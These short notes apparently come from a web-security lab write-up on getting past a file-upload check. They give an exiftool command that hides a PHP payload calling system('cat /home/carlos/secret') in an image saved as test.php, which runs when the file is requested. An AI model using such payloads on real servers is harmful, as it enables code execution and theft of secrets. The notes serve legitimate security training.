- the server checks the file's content
- By uploading test.php, which is an image but with the .php extension, the server accepted it, so no extension checks
- We use exiftool to inject malicious code in the image through the command :
    exiftool -comment="<?php echo system('cat /home/carlos/secret') ?>" test.php
- We then just upload the image and access it, which will dump the image contents with the flag :)
